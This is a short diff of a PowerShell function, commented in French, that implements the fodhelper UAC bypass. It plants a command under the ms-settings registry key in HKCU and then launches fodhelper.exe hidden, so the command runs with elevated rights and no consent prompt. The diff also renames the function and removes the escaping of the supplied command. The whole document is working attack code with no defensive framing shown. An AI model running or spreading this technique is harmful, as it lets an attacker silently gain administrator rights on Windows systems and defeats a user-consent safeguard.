@@ -1,15 +1,12 @@
-function UACFodhelperBypass {
+function FodhelperBypass {
     [CmdletBinding()]
     Param (
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$Command
     )
 
-    # Échappe la commande pour l’insérer dans cmd.exe /c start
-    $escaped = $Command.Replace('"', '""')  # double quote escaping for cmd
-
-    # Format final
-    $payload = "cmd.exe /c start \"\" $escaped"
+    # On ne met pas de guillemets autour du programme dans CMD
+    $payload = "cmd.exe /c \"\" $Command"
 
     # Crée la clé de registre pour le bypass
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
@@ -19,7 +16,6 @@ function UACFodhelperBypass {
     # Lance le bypass via fodhelper (élévation sans prompt)
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
-    # Attends un peu pour laisser le temps au shell élevé de se lancer
     Start-Sleep -Seconds 3
 
     # Nettoyage
